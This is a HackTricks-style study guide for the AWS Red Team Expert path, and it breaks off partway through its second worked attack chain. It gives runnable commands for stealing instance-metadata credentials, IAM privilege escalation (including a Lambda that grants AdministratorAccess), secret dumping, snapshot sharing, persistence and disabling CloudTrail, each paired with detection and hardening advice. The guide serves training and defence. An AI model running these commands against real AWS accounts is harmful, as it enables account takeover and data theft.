---
title:       "ARTE Exam"
summary:     "HACKTRICKS ARTE - AWS RED TEAM EXPERT"
category:    "HackTricks"
tags:        [arte, hacktricks]
updated:     2026-07-27
---

{% raw %}

## ARTE Field Guide — AWS Red Team Expert (HackTricks) · Large Documented Edition

The most complete build of this reference for the HackTricks **AWS Red Team Expert (ARTE)** path. Every service section gives you **more commands with documentation of what each call does**, the **misconfig/privesc vector**, a **worked example**, and **Detect & Harden**. It maps **Pacu** modules to each phase, shows **example CloudTrail event JSON**, and ends with **two full annotated attack chains** (whitebox/internal SSRF chain *and* an external/unauthenticated chain).

> ⚠️ **Authorized use only.** Every command targets AWS accounts you own or are contractually engaged to test. All AWS API activity is logged and attributable — stay within scope, retain evidence, and remediate what you prove. ARTE is purple-team: exploit to prove impact, then close the gap.

---

## Table of Contents

1. AWS Fundamentals & Policy Evaluation
2. Tooling, Pacu Modules & Operational Setup
3. Credential Access & Initial Footholds
4. IAM — Enumeration & the Privilege-Escalation Catalog
5. STS — AssumeRole, Federation & Confused Deputy
6. KMS
7. Secrets Manager & SSM Parameter Store
8. S3
9. EC2, EBS, SSM, AMI & VPC
10. Lambda
11. API Gateway
12. Containers: ECR & ECS
13. Data Stores: RDS, DynamoDB, EFS
14. App / CI: Elastic Beanstalk, CodeBuild, LightSail
15. Messaging & Orchestration: SQS, SNS, Step Functions, EventBridge
16. Cognito
17. Persistence Techniques (and their telemetry)
18. Methodologies (Whitebox, Black box I & II)
19. Detection Mechanisms (with example event JSON)
20. Worked Attack Chain #1 — Internal (SSRF → account takeover → cross-account)
21. Worked Attack Chain #2 — External / Unauthenticated
22. Defense / Hardening Master Checklist
23. AWS CLI & Pacu Quick Reference + Glossary

---

## 1. AWS Fundamentals & Policy Evaluation

**Account & Organizations.** An **AWS account** is a hard security/billing boundary. **AWS Organizations** nests accounts under a **management (payer)** account into **Organizational Units (OUs)**, governed by **Service Control Policies (SCPs)** — org-wide *maximum-permission guardrails*. Blocked actions surface in CloudTrail as an **explicit deny**.

```bash
# Organizations enumeration (if permitted from a member/mgmt account)
aws organizations describe-organization
aws organizations list-accounts
aws organizations list-roots
aws organizations list-policies --filter SERVICE_CONTROL_POLICY
aws organizations list-organizational-units-for-parent --parent-id <root-id>
```

**Principals:** **root** (owner, lock down), **IAM user** (long-lived; keys `AKIA…`), **IAM role** (assumable → temporary STS `ASIA…`; used by EC2 instance profiles, Lambda/ECS execution, federation, cross-account), **IAM group** (permission container, not assumable), **federated** (SAML/OIDC/Cognito/Identity Center).

**ARN:** `arn:aws:service:region:account-id:resource` — the universal handle in policies.

**Policy evaluation order (memorize):**

1. **Explicit**`Deny` anywhere → **denied** (always wins).
2. **SCP** must allow (Organizations guardrail).
3. **Permission boundary** (if set) must allow.
4. **Session policy** (if assuming with one) must allow.
5. An **identity-based** *or* **resource-based** `Allow` must exist.

`Effective ≈ SCP ∩ boundary ∩ (identity|resource Allow) − any Deny`. **Resource-based policies** (S3/KMS/SQS/SNS/Lambda) can grant **cross-account** access independent of the caller's identity policy — a top misconfig.

**Condition keys that matter:** `aws:SourceIp`, `aws:PrincipalArn`, `aws:MultiFactorAuthPresent`, `sts:ExternalId`, `aws:SourceArn`/`aws:SourceAccount` (confused-deputy defense), `aws:ResourceTag`/`aws:PrincipalTag` (ABAC), `aws:ViaAWSService`.

**Shared Responsibility:** AWS secures *of* the cloud; you secure *in* the cloud (IAM, data, config). Almost every finding is customer misconfig.

---

## 2. Tooling, Pacu Modules & Operational Setup

```bash
aws configure --profile target        # store creds under test (or export env vars)
export AWS_PROFILE=target
aws sts get-caller-identity           # who/what account (first call every time)
aws configure list                    # confirm which creds/region are active
```

**Assessment tools:**

| Tool | Use |
|---|---|
| **Pacu** | Modular AWS exploitation framework (enum → privesc → persistence → exfil) |
| **enumerate-iam** | Brute-tests which API calls creds can make (low-noise permission map) |
| **ScoutSuite** | Multi-cloud misconfiguration auditor (HTML report) |
| **Prowler** | CIS / AWS FSBP + attack-surface checks |
| **CloudMapper / cartography** | Graph the environment + trust edges |
| **aws\_consoler** | Turn CLI creds → browser console session |
| **cloud\_enum / s3scanner** | Discover public buckets & assets (external) |

**Pacu phase map (run inside**`pacu`**):**

```text
import_keys <profile>                          # load creds
run iam__enum_permissions                       # what can this principal do?
run iam__enum_users_roles_policies_groups       # full IAM inventory
run iam__privesc_scan                           # detect & (optionally) exploit privesc paths
run ec2__enum ; run s3__bucket_finder           # service enumeration
run ec2__download_userdata                       # secrets in user-data
run secrets__enum ; run lambda__enum            # secrets / functions
run iam__backdoor_users_keys                     # persistence (authorized)
run detection__enum_services ; run detection__disruption   # know/attack logging (authorized)
```

**Operational notes:** enumeration is mostly **per-region** (iterate); temporary creds **expire** (watch `Expiration`); every call is attributable — prefer targeted enumeration when stealth matters.

```bash
for r in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  echo "== $r =="; aws ec2 describe-instances --region $r --query 'Reservations[].Instances[].InstanceId' --output text
done
```

---

## 3. Credential Access & Initial Footholds

**Sources:** leaked access keys (GitHub/`.env`/CI logs/image layers), **SSRF → EC2 IMDS**, **EC2 user-data**, **Lambda/ECS env vars**, `~/.aws/credentials`, over-shared **resource policies**, public **Cognito** unauth pools.

**EC2 IMDS (classic pivot):**

```bash
# IMDSv1 — no token (insecure legacy)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
# -> {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
# IMDSv2 — session-token required (PUT then GET)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data                              # secrets in user-data
curl http://169.254.169.254/latest/dynamic/instance-identity/document     # acct/region/instance
```

**ECS/EKS task creds (container metadata):**

```bash
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI    # ECS task-role creds JSON
```

**Load stolen temporary creds:**

```bash
export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

**Detect & Harden:** enforce **IMDSv2** (`HttpTokens=required`, hop-limit 1) — this alone kills most SSRF cred theft; GuardDuty raises `InstanceCredentialExfiltration` when instance creds are used off-instance; no secrets in user-data/env/images; scan repos/CI; short-lived creds + rotation.

```bash
# hardening command — require IMDSv2 on an instance:
aws ec2 modify-instance-metadata-options --instance-id i-... --http-tokens required --http-put-response-hop-limit 1
```

---

## 4. IAM — Enumeration & the Privilege-Escalation Catalog

### Enumerate (with docs)

```bash
aws iam get-user                                   # your user (if you're a user)
aws iam get-account-authorization-details          # ENTIRE IAM graph: users/roles/groups/policies
aws iam list-users; aws iam list-roles; aws iam list-groups
aws iam list-policies --scope Local                # customer-managed policies
aws iam list-attached-user-policies --user-name svc     # managed policies on a user
aws iam list-user-policies --user-name svc              # inline policies on a user
aws iam get-user-policy --user-name svc --policy-name p # read an inline policy doc
aws iam get-policy-version --policy-arn <arn> --version-id v3   # read a managed policy doc
aws iam list-access-keys --user-name svc                # existing keys (+ age)
aws iam list-instance-profiles                          # roles attachable to EC2
aws iam get-role --role-name r                          # incl. AssumeRolePolicyDocument (trust)
# "Can I do X?" without doing it (uses the same evaluation engine):
aws iam simulate-principal-policy --policy-source-arn <yourArn> \
  --action-names iam:PutUserPolicy sts:AssumeRole iam:PassRole
```

### Privilege-escalation catalog (documented paths)

| # | Permission(s) | Escalation |
|---|---|---|
| 1 | `iam:CreatePolicyVersion` | New **default** version granting `*:*` |
| 2 | `iam:SetDefaultPolicyVersion` | Roll default to an existing permissive version |
| 3 | `iam:AttachUserPolicy` | Attach `AdministratorAccess` to yourself |
| 4 | `iam:AttachGroupPolicy` | Attach admin to a group you're in |
| 5 | `iam:AttachRolePolicy` (+assume) | Attach admin to an assumable role |
| 6 | `iam:PutUserPolicy` | Inline admin on yourself |
| 7 | `iam:PutGroupPolicy` / `PutRolePolicy` | Inline admin on group/role |
| 8 | `iam:CreateAccessKey` | Keys for a privileged user |
| 9 | `iam:CreateLoginProfile` | Console password on a privileged user |
| 10 | `iam:UpdateLoginProfile` | Reset a privileged user's password |
| 11 | `iam:AddUserToGroup` | Join an admin group |
| 12 | `iam:UpdateAssumeRolePolicyDocument` (+assume) | Make a privileged role trust you |
| 13 | `iam:PassRole` + `ec2:RunInstances` | Launch instance w/ powerful profile → IMDS creds |
| 14 | `iam:PassRole` + `lambda:CreateFunction` + `InvokeFunction` | Run code as a powerful role |
| 15 | `iam:PassRole` + `lambda:CreateFunction` + `CreateEventSourceMapping` | Trigger without direct invoke |
| 16 | `iam:PassRole` + `glue:CreateDevEndpoint` | Run as a Glue role |
| 17 | `iam:PassRole` + `cloudformation:CreateStack` | Deploy as a powerful role |
| 18 | `iam:PassRole` + `datapipeline:*` | Execute as a pipeline role |
| 19 | `iam:PassRole` + `codebuild:CreateProject/StartBuild` | RCE as the CodeBuild role |
| 20 | `iam:CreateRole` + `iam:AttachRolePolicy` + PassRole | Build an admin role and pass it |
| 21 | `sts:AssumeRole` on an over-trusting role | Directly assume a privileged role |

**Example — #1 CreatePolicyVersion:**

```bash
aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/EditableByMe \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**Example — #8 CreateAccessKey for a privileged user:**

```bash
aws iam create-access-key --user-name admin    # returns AKIA.../secret for that user
```

**Example — #14 PassRole → Lambda:**

```bash
cat > f.py <<'EOF'
import boto3
def h(e,c):
    return boto3.client('iam').attach_user_policy(
        UserName='pentest', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
EOF
zip f.zip f.py
aws lambda create-function --function-name pwn --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/PowerfulRole --handler f.h --zip-file fileb://f.zip
aws lambda invoke --function-name pwn out.json
```

**Automate detection with Pacu:** `run iam__privesc_scan` enumerates which of these paths your principal can take. **Detect & Harden:** alarm on `iam:Create*/Attach*/Put*`, `CreatePolicyVersion`, `SetDefaultPolicyVersion`, `UpdateAssumeRolePolicyDocument`, `CreateLoginProfile`, `CreateAccessKey`; **scope**`iam:PassRole` to explicit role ARNs; permission boundaries + SCPs; MFA on sensitive IAM.

---

## 5. STS — AssumeRole, Federation & Confused Deputy

```bash
aws sts get-caller-identity
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Target --role-session-name s1
aws sts assume-role --role-arn <arn> --role-session-name s1 --external-id <id>   # trust requires ExternalId
aws sts assume-role --role-arn <arn> --role-session-name s1 --serial-number <mfa-arn> --token-code 123456
aws sts get-session-token --serial-number <mfa-arn> --token-code 123456           # MFA-elevated session
aws sts get-federation-token --name fed --policy file://sess.json                 # scoped federated creds
aws sts decode-authorization-message --encoded-message <msg>                      # decode a deny reason
```

**Documentation:** `AssumeRole` returns temp creds valid up to the role's `MaxSessionDuration`; `ExternalId` is a shared secret in cross-account trust to defeat the **confused deputy**; `decode-authorization-message` turns the opaque blob in an `AccessDenied` into readable policy context. **Trust weaknesses:** `Principal:"*"`, whole-account trust, or missing `ExternalId`/conditions → unintended assumption. Enumerate with `iam:GetRole`/`get-account-authorization-details`. **Detect & Harden:** explicit-principal trust; require `ExternalId`+MFA on cross-account; short sessions; alert on `AssumeRole` from new IPs/accounts.

---

## 6. KMS

```bash
aws kms list-keys; aws kms list-aliases
aws kms describe-key --key-id <id>                              # metadata, key state
aws kms get-key-policy --key-id <id> --policy-name default      # WHO can use/admin the key
aws kms list-grants --key-id <id>                               # delegated key use
aws kms decrypt --ciphertext-blob fileb://blob --key-id <id> --output text --query Plaintext | base64 -d
aws kms encrypt --key-id <id> --plaintext fileb://data --output text --query CiphertextBlob
aws kms generate-data-key --key-id <id> --key-spec AES_256      # envelope-encryption data key
```

**Misconfig:** permissive **key policies**/grants (`kms:Decrypt`/`GenerateDataKey`); a principal that can read *both* the encrypted data (S3/Secrets/EBS snapshot) **and** use the key = full plaintext access. **Detect & Harden:** least-privilege key policies; separate data-read from key-use; enable rotation; alert on anomalous `Decrypt` volume; minimize grants.

---

## 7. Secrets Manager & SSM Parameter Store

```bash
# Secrets Manager
aws secretsmanager list-secrets --query 'SecretList[].[Name,ARN]' --output text
aws secretsmanager get-secret-value --secret-id prod/db --query SecretString --output text
aws secretsmanager get-resource-policy --secret-id prod/db      # cross-account exposure?
aws secretsmanager describe-secret --secret-id prod/db          # rotation config, KMS key
# SSM Parameter Store — SecureString often holds passwords/keys
aws ssm describe-parameters --query 'Parameters[].Name'
aws ssm get-parameters-by-path --path / --recursive --with-decryption \
  --query 'Parameters[].[Name,Value]' --output text
aws ssm get-parameter --name /prod/db/password --with-decryption --query Parameter.Value --output text
```

**Misconfig:** broad `secretsmanager:GetSecretValue` / `ssm:GetParameter*` + `--with-decryption` → creds/keys/tokens → lateral movement. **Detect & Harden:** scope reads to specific ARNs; tight KMS on SecureString; rotation; GuardDuty/CloudTrail alerting on bulk `GetSecretValue`/`GetParametersByPath`.

---

## 8. S3

```bash
aws s3 ls                                        # buckets you can list
aws s3 ls s3://bucket --recursive                # objects
aws s3api list-buckets --query 'Buckets[].Name'
aws s3api get-bucket-policy --bucket b           # resource policy (cross-account/public?)
aws s3api get-bucket-acl --bucket b              # legacy ACL grants
aws s3api get-public-access-block --bucket b     # is BPA on?
aws s3api get-bucket-encryption --bucket b       # default encryption?
aws s3api get-bucket-versioning --bucket b
aws s3 cp s3://bucket/secret.txt .               # read one object
aws s3 sync s3://bucket ./loot                   # bulk (authorized) exfil
curl -s https://bucket.s3.amazonaws.com/          # unauth check of a guessed bucket (lists if public)
```

**Misconfig:** public buckets/objects, permissive **bucket policy/ACL**, disabled **Block Public Access**, writable buckets (overwrite a served site/artifact → supply-chain), unencrypted sensitive data. **Detect & Harden:** account+bucket **Block Public Access**; least-privilege policies; SSE-KMS default; versioning + MFA-delete; CloudTrail **S3 data events**; Macie for sensitive-data discovery.

```bash
aws s3api put-public-access-block --bucket b --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
```

---

## 9. EC2, EBS, SSM, AMI & VPC

```bash
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,IamInstanceProfile.Arn,PublicIpAddress,State.Name]'
aws ec2 describe-instance-attribute --instance-id i-... --attribute userData --query UserData --output text | base64 -d
aws ec2 describe-security-groups --query 'SecurityGroups[].[GroupId,IpPermissions]'
aws ec2 describe-vpcs; aws ec2 describe-subnets; aws ec2 describe-route-tables
# AMIs / snapshots (data theft without touching a running host)
aws ec2 describe-images --owners self
aws ec2 describe-snapshots --owner-ids self
aws ec2 create-volume --snapshot-id snap-... --availability-zone <az>   # attach + mount to your box to read
aws ec2 modify-snapshot-attribute --snapshot-id snap-... --attribute createVolumePermission --operation-type add --user-ids <you>  # share to your acct (misconfig demo)
# SSM = RCE / shell on managed instances (no SSH/keys)
aws ssm describe-instance-information
aws ssm send-command --document-name AWS-RunShellScript \
  --targets Key=instanceIds,Values=i-... \
  --parameters commands='id;hostname;curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'
aws ssm start-session --target i-...
```

**Misconfig:** secrets in **user-data**; wide-open SGs (0.0.0.0/0); shared/public **AMIs & EBS snapshots**; `ssm:SendCommand`/`StartSession` RCE; `iam:PassRole`+`ec2:RunInstances` → new box with a powerful profile → IMDS creds. **Detect & Harden:** IMDSv2 required; no user-data secrets; tight SGs; private snapshots/AMIs; restrict SSM; VPC flow logs; GuardDuty on anomalous instance behavior.

---

## 10. Lambda

```bash
aws lambda list-functions --query 'Functions[].[FunctionName,Role,Runtime]'
aws lambda get-function-configuration --function-name f --query Environment      # env vars (often secrets)
aws lambda get-function --function-name f --query Code.Location                   # presigned code URL -> download
aws lambda get-policy --function-name f                                           # resource policy (who can invoke)
aws lambda list-layers                                                            # shared code layers (secrets?)
aws lambda update-function-code --function-name f --zip-file fileb://evil.zip     # writable -> run as role
aws lambda invoke --function-name f out.json && cat out.json
```

**Misconfig:** secrets in **env vars**, over-privileged **execution role**, writable code (`UpdateFunctionCode` → run as role), permissive resource policy (external invoke). With `iam:PassRole`, Lambda is a top privesc sink (§4 #14–15). **Detect & Harden:** secrets in Secrets Manager (tight KMS); least-privilege execution roles; restrict `UpdateFunctionCode`/`AddPermission`; monitor code/config changes.

---

## 11. API Gateway

```bash
aws apigateway get-rest-apis
aws apigateway get-resources --rest-api-id <id>
aws apigateway get-stages --rest-api-id <id>
aws apigateway get-authorizers --rest-api-id <id>       # is auth enforced?
aws apigateway get-api-keys --include-values            # leaked keys
aws apigateway get-usage-plans
aws apigatewayv2 get-apis                               # HTTP/WebSocket APIs
```

**Misconfig:** missing/misconfigured **authorizers**, exposed **API keys**, over-privileged backend Lambda/role, IAM-auth endpoints callable by broad principals. **Detect & Harden:** enforce authorizers (Cognito/Lambda/IAM); rotate/scope keys; WAF in front; log execution/access.

---

## 12. Containers: ECR & ECS

```bash
# ECR — image layers frequently embed secrets/creds
aws ecr describe-repositories
aws ecr get-repository-policy --repository-name r        # cross-account/public pull?
aws ecr list-images --repository-name r
aws ecr batch-get-image --repository-name r --image-ids imageTag=latest
aws ecr get-login-password | docker login --username AWS --password-stdin <acct>.dkr.ecr.<region>.amazonaws.com
docker pull <acct>.dkr.ecr.<region>.amazonaws.com/r:tag  # inspect layers (dive/history) for secrets
# ECS
aws ecs list-clusters; aws ecs list-tasks --cluster c
aws ecs describe-task-definition --task-definition td \
  --query 'taskDefinition.[taskRoleArn,containerDefinitions[].environment]'   # task role + env secrets
aws ecs list-container-instances --cluster c
```

**Misconfig:** secrets in images/task-def **env**; over-privileged **task roles**; public **repo policies**; `ecs:RunTask`+PassRole → run as a privileged role. Task metadata vends task-role creds (§3). **Detect & Harden:** ECR image scanning; no secrets in images/task-defs (Secrets Manager); least-privilege task/execution roles; private repo policies.

---

## 13. Data Stores: RDS, DynamoDB, EFS

```bash
aws rds describe-db-instances --query 'DBInstances[].[DBInstanceIdentifier,PubliclyAccessible,Endpoint.Address,MasterUsername]'
aws rds describe-db-snapshots --query 'DBSnapshots[].[DBSnapshotIdentifier,Encrypted]'
aws rds describe-db-cluster-snapshots
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier pwn --db-snapshot-identifier snap  # read stolen DB
aws rds modify-db-snapshot-attribute --db-snapshot-identifier snap --attribute-name restore --values-to-add <acct>  # share (misconfig demo)
aws dynamodb list-tables; aws dynamodb describe-table --table-name t
aws dynamodb scan --table-name t --max-items 50           # dump rows (broad read)
aws efs describe-file-systems; aws efs describe-mount-targets --file-system-id fs-...
```

**Misconfig:** **public** RDS; shared/public **snapshots**; broad DynamoDB `Scan`/`GetItem`; EFS mount targets with permissive SGs (mount & read). **Detect & Harden:** no public DB; private/encrypted snapshots; least-privilege data APIs; tight EFS SGs; data-event logging.

---

## 14. App / CI: Elastic Beanstalk, CodeBuild, LightSail

```bash
aws elasticbeanstalk describe-applications
aws elasticbeanstalk describe-environments --query 'Environments[].[EnvironmentName,EndpointURL]'
aws elasticbeanstalk describe-configuration-settings --application-name a --environment-name e  # env vars/secrets
aws codebuild list-projects
aws codebuild batch-get-projects --names p --query 'projects[].[serviceRole,environment.environmentVariables]'
aws codebuild start-build --project-name p --buildspec-override file://evil-buildspec.yml   # RCE as build role
aws lightsail get-instances
aws lightsail get-instance-access-details --instance-name i     # temp SSH access
```

**Misconfig:** editable CodeBuild project/buildspec → **RCE as the build service role** (§4 #19); Beanstalk EC2 instance-profile creds via IMDS; LightSail instance access. **Detect & Harden:** least-privilege service roles; restrict `codebuild:UpdateProject/StartBuild`; no secrets in buildspec/env; alert on build starts + project edits.

---

## 15. Messaging & Orchestration: SQS, SNS, Step Functions, EventBridge

```bash
aws sqs list-queues
aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy          # cross-account send/receive?
aws sqs receive-message --queue-url <url>                                        # read messages (data)
aws sns list-topics
aws sns get-topic-attributes --topic-arn <arn>                                   # policy (who can publish/subscribe)
aws sns subscribe --topic-arn <arn> --protocol https --notification-endpoint https://you   # intercept
aws stepfunctions list-state-machines
aws stepfunctions describe-state-machine --state-machine-arn <arn> --query roleArn
aws scheduler list-schedules; aws events list-rules
aws events list-targets-by-rule --rule r
```

**Misconfig:** permissive SQS/SNS **resource policies** (cross-account publish/subscribe → interception/injection); Step Functions/EventBridge with PassRole to privileged roles; schedulers used for **persistence**. **Detect & Harden:** explicit-principal resource policies; least-privilege execution roles; alert on new rules/schedules/subscriptions.

---

## 16. Cognito

```bash
aws cognito-idp list-user-pools --max-results 20
aws cognito-idp describe-user-pool --user-pool-id <id>
aws cognito-idp list-user-pool-clients --user-pool-id <id>       # app-client settings
aws cognito-identity list-identity-pools --max-results 20
aws cognito-identity describe-identity-pool --identity-pool-id <id>   # allows unauth?
# unauth path (if enabled): identity -> temporary AWS creds
aws cognito-identity get-id --identity-pool-id <id>
aws cognito-identity get-credentials-for-identity --identity-id <idId>
```

**Misconfig:** **unauthenticated identity pools** mapped to an IAM role (anyone gets those perms); self-signup enabled; weak app-client config; over-privileged auth/unauth roles. **Detect & Harden:** disable unauth unless needed; minimize unauth/auth role perms; restrict self-signup; review identity-pool role mappings.

---

## 17. Persistence Techniques (and their telemetry)

| Technique | Command (authorized) | CloudTrail events |
|---|---|---|
| Extra access key | `aws iam create-access-key --user-name u` | `CreateAccessKey` |
| New IAM user + admin | `create-user` + `attach-user-policy` | `CreateUser`, `AttachUserPolicy` |
| Backdoor role trust | `update-assume-role-policy` (add your ARN) | `UpdateAssumeRolePolicyDocument` |
| Console password | `create-login-profile` | `CreateLoginProfile` |
| Recurring Lambda | `create-function` + `events put-rule/put-targets` | `CreateFunction`, `PutRule`, `PutTargets` |
| Resource-policy backdoor | `put-bucket-policy`/`put-key-policy`/`set-queue-attributes` | `PutBucketPolicy`/`PutKeyPolicy`/`SetQueueAttributes` |
| Disable logging | `cloudtrail stop-logging`/`delete-trail` | `StopLogging`, `DeleteTrail`, `PutEventSelectors` |
| **Harden:** alarm on all of the above — especially `StopLogging`/`DeleteTrail`, new access keys, and trust edits; Config rules for drift; Pacu's `detection__disruption` mirrors these so blue-teams can test alerting. |  |  |

---

## 18. Methodologies

### White box (given account/role access or config export)

1. **Identity:** `sts get-caller-identity` → `iam get-account-authorization-details` (or ScoutSuite/Prowler).
2. **Trust & PassRole map:** assumable roles, cross-account trust, every `iam:PassRole` edge.
3. **Privesc edges** (§4) + **data sinks** (S3/Secrets/KMS/RDS).
4. **Chain** low-priv → privesc → admin, logging every call.
5. **Report** with least-privilege fixes.

### Black box (I) — from leaked/limited creds

1. Confirm identity/account; map perms with **enumerate-iam**/Pacu `iam__enum_permissions`.
2. Enumerate reachable services per region; hunt readable secrets/S3/snapshots.
3. Pivot via IMDS/task metadata on any compute you reach.
4. Escalate via IAM/PassRole/service-role edges.

### Black box (II) — external / unauthenticated

1. OSINT for **leaked keys** (repos/CI/paste) and **public S3** (`cloud_enum`, `s3scanner`).
2. App-layer **SSRF → IMDS** for role creds.
3. **Public Cognito** identity pools → unauth creds.
4. With any credential, drop into Black box (I).

---

## 19. Detection Mechanisms (with example event JSON)

### CloudTrail — the API audit log

```bash
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name <trail>            # IsLogging true/false
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole --max-results 5
aws cloudtrail get-event-selectors --trail-name <trail>   # are data events on?
```

**Example event (an**`AttachUserPolicy`**privesc — what the SOC sees):**

```json
{
  "eventTime": "2024-05-01T12:34:56Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "AttachUserPolicy",
  "userIdentity": { "type": "AssumedRole", "arn": "arn:aws:sts::123456789012:assumed-role/ci-deployer/deploy-helper" },
  "sourceIPAddress": "203.0.113.10",
  "userAgent": "aws-cli/2.15.0",
  "requestParameters": { "userName": "pentest", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess" },
  "responseElements": null
}
```

Pivot fields: `eventName`, `userIdentity.arn`, `sourceIPAddress`, `userAgent`, `requestParameters`, `errorCode` (`AccessDenied`/explicit deny — recon signature when it appears in bulk).

### GuardDuty — managed threat detection (CloudTrail + VPC flow + DNS)

```bash
aws guardduty list-detectors
aws guardduty list-findings --detector-id <id>
aws guardduty get-findings --detector-id <id> --finding-ids <fid>
```

Notable findings: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`, `Recon:IAMUser/*`, `CredentialAccess:IAMUser/AnomalousBehavior`, `Discovery:S3/*`, `PenTest:IAMUser/KaliLinux` (yes — it flags known pentest distros), Tor/known-bad IP usage.

### The rest

| Service | Role |
|---|---|
| **CloudWatch** | Metrics/logs/**alarms** (root login, IAM changes) |
| **Security Hub** | Aggregates findings + CIS/AWS FSBP posture score |
| **Detective** | Graph investigation of findings |
| **Inspector** | Vuln scanning (EC2/ECR/Lambda) |
| **Config** | Inventory + **rules** (drift/non-compliance) |
| **Macie** | Sensitive-data discovery in S3 |
| **WAF / Shield** | Web filtering / DDoS protection |
| **Firewall Manager** | Org-wide WAF/SG/Shield policy |
| **Evasion awareness:** attackers disable CloudTrail, work in unlogged regions, or blend in with temporary creds → alert on **trail tampering** and cross-region anomalies. |  |

---

## 20. Worked Attack Chain #1 — Internal (SSRF → account takeover → cross-account)

*Realistic ARTE scenario. Each hop shows the action, the telemetry, and the fix. Lab/authorized only.*

**Setup:** internet-facing web app on EC2 with an SSRF bug; instance role `web-app-role` (intended: read one SSM path + write logs to S3).

**Hop 0 — Recon SSRF.**

```
GET /fetch?url=http://169.254.169.254/latest/meta-data/   → metadata index returns
```

**Hop 1 — Steal instance-role creds (IMDSv1).**

```
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role
→ {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
```

```bash
export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity   # assumed-role/web-app-role/i-0abc...
```

*Telemetry:* GuardDuty `InstanceCredentialExfiltration` when used off-instance. *Fix:* **IMDSv2 required + hop-limit 1** (kills the SSRF read); fix SSRF; restrict egress.

**Hop 2 — Enumerate the role (low noise).**

```bash
enumerate-iam --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY --session-token $AWS_SESSION_TOKEN
# finds: ssm:GetParametersByPath, s3:PutObject, lambda:CreateFunction, iam:PassRole (Resource:*)  ← the mistake
```

*Telemetry:* burst of `AccessDenied` in CloudTrail (recon signature). *Fix:* alarm on high `AccessDenied`/principal.

**Hop 3 — Loot SSM secrets.**

```bash
aws ssm get-parameters-by-path --path / --recursive --with-decryption --query 'Parameters[].[Name,Value]' --output text
# /prod/ci/deployer_role_arn = arn:aws:iam::123456789012:role/ci-deployer
# /prod/db/password = S3cr3t!
```

*Telemetry:* `GetParametersByPath` (decryption). *Fix:* scope SSM read to the one intended path; tighten KMS.

**Hop 4 — Privesc via PassRole + Lambda (run as**`ci-deployer`**).**

```bash
cat > f.py <<'EOF'
import boto3
def h(e,c):
    return boto3.client('iam').attach_user_policy(UserName='pentest', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
EOF
zip f.zip f.py
aws lambda create-function --function-name deploy-helper --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/ci-deployer --handler f.h --zip-file fileb://f.zip
aws lambda invoke --function-name deploy-helper out.json   # 'pentest' now admin
```

*Telemetry:* `CreateFunction` + `InvokeFunction` → `AttachUserPolicy(AdministratorAccess)` (very high-signal). *Fix:* **scope**`iam:PassRole` to needed roles only; restrict `lambda:CreateFunction`; alarm on admin-policy attach.

**Hop 5 — Access data as admin.**

```bash
aws s3 sync s3://prod-backups ./loot
aws kms decrypt --ciphertext-blob fileb://blob --key-id <id> --output text --query Plaintext | base64 -d
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier pwn --db-snapshot-identifier snap
```

*Telemetry:* S3 **data events** (if on); `Decrypt` spike. *Fix:* data-event logging + Macie; least-privilege KMS; private snapshots.

**Hop 6 — Cross-account pivot (confused deputy).**

```bash
aws sts assume-role --role-arn arn:aws:iam::222222222222:role/partner-access --role-session-name pivot
# role in acct B trusts acct A broadly with no ExternalId
```

*Telemetry:* cross-account `AssumeRole` in both trails. *Fix:* require `ExternalId`**+MFA**, scope trust to a specific principal.

**Hop 7 — Persistence (demo).**

```bash
aws iam create-access-key --user-name pentest
aws events put-rule --name keepalive --schedule-expression 'rate(1 hour)'
```

*Telemetry:* `CreateAccessKey`, `PutRule`. *Fix:* alert on new keys/rules; revoke at cleanup.

**Chain:** `SSRF + IMDSv1` → instance creds → `PassRole:*`+Lambda → admin → cross-account `AssumeRole` (no ExternalId) → data + persistence. **Breaking any one link defeats the chain.**

---

## 21. Worked Attack Chain #2 — External / Unauthenticated

*From zero credentials on the internet to a foothold. Lab/authorized only.*

**Hop 0 — OSINT for leaked keys & public assets.**

```bash
# public-bucket discovery from a company name / keyword
cloud_enum -k companyname
s3scanner scan --bucket-file guessed_names.txt
# a leaked key found in a public repo / CI log:
export AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity     # confirms it's live and shows the account/principal
```

